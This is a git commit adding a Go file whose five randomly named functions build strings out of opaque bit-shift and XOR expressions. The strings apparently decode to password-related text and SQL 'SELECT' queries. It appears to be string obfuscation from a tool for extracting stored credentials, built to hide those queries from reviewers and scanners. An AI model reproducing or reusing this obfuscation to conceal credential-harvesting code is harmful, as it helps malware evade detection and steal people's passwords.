4be42665ef72fba2094d88a5b154381055860fb3
0xhades <43064437+0xhades@users.noreply.github.com>
2021-06-15 16:48:36 +0300

    Add files via upload

---
+++ IoenQn.go
@@ -0,0 +1,176 @@
+package IoenQn
+
+import (
+	"unsafe"
+)
+
+func eax() uint8 {
+	return uint8(unsafe.Sizeof(true))
+}
+
+func OaQ7ml0() string {
+	return string(
+		[]byte{
+			((eax()<<eax()|eax())<<eax() ^ eax()) << eax() << eax() << eax() << eax(),
+			((eax()<<eax()|eax())<<eax()<<eax()<<eax()<<eax()<<eax() ^ eax()),
+			((((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax()<<eax()^eax())<<eax() ^ eax()),
+			((((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax()<<eax()^eax())<<eax() ^ eax()),
+			(((((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax()^eax())<<eax()^eax())<<eax() ^ eax()),
+			(((((eax()<<eax()|eax())<<eax()<<eax()^eax())<<eax()^eax())<<eax()^eax())<<eax() ^ eax()),
+			(((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax()<<eax() ^ eax()) << eax(),
+			((eax()<<eax()|eax())<<eax()<<eax()<<eax() ^ eax()) << eax() << eax(),
+			(((eax()<<eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax() ^ eax()),
+			(((eax()<<eax()|eax())<<eax()<<eax()<<eax()<<eax()^eax())<<eax() ^ eax()),
+			((eax()<<eax()|eax())<<eax()<<eax() ^ eax()) << eax() << eax() << eax(),
+			(((eax()<<eax()|eax())<<eax()<<eax()<<eax()^eax())<<eax()<<eax() ^ eax()),
+			(((eax()<<eax()|eax())<<eax()<<eax()<<eax()<<eax()^eax())<<eax() ^ eax()),
+			((((eax()<<eax()|eax())<<eax()<<eax()^eax())<<eax()<<eax()^eax())<<eax() ^ eax()),
+			(((eax()<<eax()<<eax()|eax())<<eax()^eax())<<eax() ^ eax()) << eax() << eax(),
+			(((eax()<<eax()|eax())<<eax()^eax())<<eax() ^ eax()) << eax() << eax() << eax(),
+			(eax()<<eax() | eax()) << eax() << eax() << eax() << eax(),
+			((eax()<<eax()|eax())<<eax()<<eax()<<eax() ^ eax()) << eax(),
+			(((eax()<<eax()<<eax()|eax())<<eax()^eax())<<eax() ^ eax()) << eax() << eax(),
+			(((eax()<<eax()|eax())<<eax()^eax())<<eax() ^ eax()) << eax() << eax() << eax(),
+			(eax()<<eax() | eax()) << eax() << eax() << eax() << eax(),
+			((eax()<<eax()|eax())<<eax()<<eax()<<eax() ^ eax()) << eax(),
+		},
+	)
+}
+
+func UNCbua1() string {
+	return string(
+		[]byte{
+			((((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax()<<eax()^eax())<<eax() ^ eax()),
+			(((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax()<<eax()<<eax() ^ eax()),
+			(((eax()<<eax()|eax())<<eax()<<eax()^eax())<<eax() ^ eax()) << eax() << eax(),
+			(((eax()<<eax()|eax())<<eax()<<eax()^eax())<<eax()<<eax()<<eax() ^ eax()),
+			(((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax() ^ eax()) << eax() << eax(),
+			(((eax()<<eax()|eax())<<eax()<<eax()<<eax()^eax())<<eax()<<eax() ^ eax()),
+			(((eax()<<eax()|eax())<<eax()<<eax()<<eax()^eax())<<eax() ^ eax()),
+		},
+	)
+}
+
+func M2oYBh2() string {
+	return string(
+		[]byte{
+			(((eax()<<eax()<<eax()|eax())<<eax()<<eax()<<eax()^eax())<<eax() ^ eax()),
+			((eax()<<eax()<<eax()<<eax()<<eax()|eax())<<eax()<<eax() ^ eax()),
+			((eax()<<eax()<<eax()<<eax()|eax())<<eax() ^ eax()) << eax() << eax(),
+			((eax()<<eax()<<eax()<<eax()<<eax()|eax())<<eax()<<eax() ^ eax()),
+			((eax()<<eax()<<eax()<<eax()<<eax()<<eax()|eax())<<eax() ^ eax()),
+			((eax()<<eax()<<eax()|eax())<<eax()<<eax() ^ eax()) << eax() << eax(),
+			eax() << eax() << eax() << eax() << eax() << eax(),
+			(((eax()<<eax()|eax())<<eax()<<eax()^eax())<<eax()<<eax()<<eax() ^ eax()),
+			(((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax() ^ eax()) << eax() << eax(),
+			(((eax()<<eax()|eax())<<eax()<<eax()<<eax()^eax())<<eax()<<eax() ^ eax()),
+			((((eax()<<eax()|eax())<<eax()<<eax()^eax())<<eax()^eax())<<eax()<<eax() ^ eax()),
+			((eax()<<eax()|eax())<<eax()<<eax()<<eax()<<eax() ^ eax()),
+			((eax()<<eax()<<eax()|eax())<<eax() ^ eax()) << eax() << eax(),
+			(((eax()<<eax()|eax())<<eax()<<eax()^eax())<<eax()<<eax()<<eax() ^ eax()),
+			(((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax() ^ eax()) << eax() << eax(),
+			(((eax()<<eax()|eax())<<eax()<<eax()<<eax()^eax())<<eax()<<eax() ^ eax()),
+			((((eax()<<eax()|eax())<<eax()<<eax()^eax())<<eax()^eax())<<eax()<<eax() ^ eax()),
+			((eax()<<eax()|eax())<<eax()<<eax()<<eax() ^ eax()) << eax(),
+			eax() << eax() << eax() << eax() << eax() << eax(),
+			((eax()<<eax()<<eax()<<eax()<<eax()|eax())<<eax() ^ eax()) << eax(),
+			((eax()<<eax()<<eax()|eax())<<eax()<<eax()<<eax() ^ eax()) << eax(),
+			((((eax()<<eax()<<eax()<<eax()|eax())<<eax()^eax())<<eax()^eax())<<eax() ^ eax()),
+			(((eax()<<eax()<<eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax() ^ eax()),
+			eax() << eax() << eax() << eax() << eax() << eax(),
+			((((eax()<<eax()|eax())<<eax()<<eax()^eax())<<eax()^eax())<<eax()<<eax() ^ eax()),
+			(((eax()<<eax()|eax())<<eax()<<eax()<<eax()^eax())<<eax()<<eax() ^ eax()),
+			(((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax() ^ eax()) << eax() << eax(),
+			((eax()<<eax()|eax())<<eax()<<eax()<<eax()<<eax()<<eax() ^ eax()),
+			((eax()<<eax()|eax())<<eax()<<eax()<<eax() ^ eax()) << eax() << eax(),
+			((eax()<<eax()|eax())<<eax()<<eax()<<eax()<<eax()<<eax() ^ eax()),
+			(((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax() ^ eax()) << eax() << eax(),
+			((eax()<<eax()|eax())<<eax()<<eax()<<eax()<<eax()<<eax() ^ eax()),
+			eax() << eax() << eax() << eax() << eax() << eax(),
+			((((eax()<<eax()<<eax()|eax())<<eax()<<eax()^eax())<<eax()^eax())<<eax() ^ eax()),
+			(eax()<<eax()<<eax()<<eax() | eax()) << eax() << eax() << eax(),
+			((eax()<<eax()<<eax()<<eax()<<eax()|eax())<<eax()<<eax() ^ eax()),
+			((eax()<<eax()<<eax()|eax())<<eax()<<eax()<<eax() ^ eax()) << eax(),
+			((eax()<<eax()<<eax()<<eax()<<eax()|eax())<<eax()<<eax() ^ eax()),
+			eax() << eax() << eax() << eax() << eax() << eax(),
+			(((eax()<<eax()|eax())<<eax()<<eax()^eax())<<eax()<<eax()<<eax() ^ eax()),
+			((eax()<<eax()|eax())<<eax()<<eax()<<eax() ^ eax()) << eax() << eax(),
+			eax() << eax() << eax() << eax() << eax() << eax(),
+			((((eax()<<eax()|eax())<<eax()^eax())<<eax()^eax())<<eax()<<eax() ^ eax()),
+			eax() << eax() << eax() << eax() << eax() << eax(),
+			(((eax()<<eax()<<eax()<<eax()|eax())<<eax()^eax())<<eax() ^ eax()),
+			((eax()<<eax()|eax())<<eax() ^ eax()) << eax() << eax() << eax() << eax(),
+			((eax()<<eax()|eax())<<eax()<<eax()<<eax()<<eax()<<eax() ^ eax()),
+			((((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax()<<eax()^eax())<<eax() ^ eax()),
+			((((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax()<<eax()^eax())<<eax() ^ eax()),
+			(((((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax()^eax())<<eax()^eax())<<eax() ^ eax()),
+			(((((eax()<<eax()|eax())<<eax()<<eax()^eax())<<eax()^eax())<<eax()^eax())<<eax() ^ eax()),
+			(((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax()<<eax() ^ eax()) << eax(),
+			((eax()<<eax()|eax())<<eax()<<eax()<<eax() ^ eax()) << eax() << eax(),
+			(((eax()<<eax()<<eax()<<eax()|eax())<<eax()^eax())<<eax() ^ eax()),
+		},
+	)
+}
+
+func J3haXV3() string {
+	return string(
+		[]byte{
+			(((eax()<<eax()|eax())<<eax()<<eax()^eax())<<eax()<<eax()<<eax() ^ eax()),
+			((((eax()<<eax()|eax())<<eax()<<eax()^eax())<<eax()^eax())<<eax() ^ eax()) << eax(),
+			((((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax()^eax())<<eax() ^ eax()) << eax(),
+			((eax()<<eax()|eax())<<eax()<<eax()<<eax()<<eax()<<eax() ^ eax()),
+			(((eax()<<eax()|eax())<<eax()<<eax()^eax())<<eax() ^ eax()) << eax() << eax(),
+			(((eax()<<eax()|eax())<<eax()<<eax()^eax())<<eax()<<eax()<<eax() ^ eax()),
+			((eax()<<eax()|eax())<<eax()<<eax()<<eax() ^ eax()) << eax() << eax(),
+			eax() << eax() << eax() << eax() << eax() << eax(),
+			((((eax()<<eax()|eax())<<eax()<<eax()^eax())<<eax()^eax())<<eax()<<eax() ^ eax()),
+			((eax()<<eax()|eax())<<eax()<<eax()<<eax()<<eax()<<eax() ^ eax()),
+			((((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax()<<eax()^eax())<<eax() ^ eax()),
+			(((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax() ^ eax()) << eax() << eax(),
+			(((eax()<<eax()|eax())<<eax()<<eax()<<eax()^eax())<<eax()<<eax() ^ eax()),
+			(((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax()<<eax() ^ eax()) << eax(),
+			eax() << eax() << eax() << eax() << eax() << eax(),
+			((eax()<<eax()|eax())<<eax() ^ eax()) << eax() << eax() << eax() << eax(),
+			((eax()<<eax()|eax())<<eax()<<eax()<<eax()<<eax()<<eax() ^ eax()),
+			((((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax()<<eax()^eax())<<eax() ^ eax()),
+			((((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax()<<eax()^eax())<<eax() ^ eax()),
+			(((((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax()^eax())<<eax()^eax())<<eax() ^ eax()),
+			(((((eax()<<eax()|eax())<<eax()<<eax()^eax())<<eax()^eax())<<eax()^eax())<<eax() ^ eax()),
+			(((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax()<<eax() ^ eax()) << eax(),
+			((eax()<<eax()|eax())<<eax()<<eax()<<eax() ^ eax()) << eax() << eax(),
+		},
+	)
+}
+
+func Nv1LGH4() string {
+	return string(
+		[]byte{
+			(((eax()<<eax()<<eax()|eax())<<eax()<<eax()<<eax()^eax())<<eax() ^ eax()),
+			((eax()<<eax()<<eax()<<eax()<<eax()|eax())<<eax()<<eax() ^ eax()),
+			((eax()<<eax()<<eax()<<eax()|eax())<<eax() ^ eax()) << eax() << eax(),
+			((eax()<<eax()<<eax()<<eax()<<eax()|eax())<<eax()<<eax() ^ eax()),
+			((eax()<<eax()<<eax()<<eax()<<eax()<<eax()|eax())<<eax() ^ eax()),
+			((eax()<<eax()<<eax()|eax())<<eax()<<eax() ^ eax()) << eax() << eax(),
+			eax() << eax() << eax() << eax() << eax() << eax(),
+			((eax()<<eax()|eax())<<eax()<<eax()<<eax()<<eax()<<eax() ^ eax()),
+			((eax()<<eax()|eax())<<eax()<<eax()<<eax()<<eax() ^ eax()),
+			((eax()<<eax()|eax())<<eax()<<eax()<<eax()<<eax() ^ eax()),
+			eax() << eax() << eax() << eax() << eax() << eax(),
+			((eax()<<eax()<<eax()<<eax()<<eax()|eax())<<eax() ^ eax()) << eax(),
+			((eax()<<eax()<<eax()|eax())<<eax()<<eax()<<eax() ^ eax()) << eax(),
+			((((eax()<<eax()<<eax()<<eax()|eax())<<eax()^eax())<<eax()^eax())<<eax() ^ eax()),
+			(((eax()<<eax()<<eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax() ^ eax()),
+			eax() << eax() << eax() << eax() << eax() << eax(),
+			((((eax()<<eax()|eax())<<eax()<<eax()^eax())<<eax()^eax())<<eax() ^ eax()) << eax(),
+			((((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax()<<eax()^eax())<<eax() ^ eax()),
+			((((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax()<<eax()^eax())<<eax() ^ eax()),
+			(eax()<<eax()<<eax() | eax()) << eax() << eax() << eax() << eax(),
+			(((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax()<<eax() ^ eax()) << eax(),
+			(((eax()<<eax()|eax())<<eax()<<eax()^eax())<<eax()<<eax()<<eax() ^ eax()),
+			((((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax()^eax())<<eax() ^ eax()) << eax(),
+			((eax()<<eax()|eax())<<eax()<<eax()<<eax()<<eax()<<eax() ^ eax()),
+			(((eax()<<eax()|eax())<<eax()^eax())<<eax()<<eax() ^ eax()) << eax() << eax(),
+			(((eax()<<eax()|eax())<<eax()<<eax()<<eax()^eax())<<eax()<<eax() ^ eax()),
+		},
+	)
+}
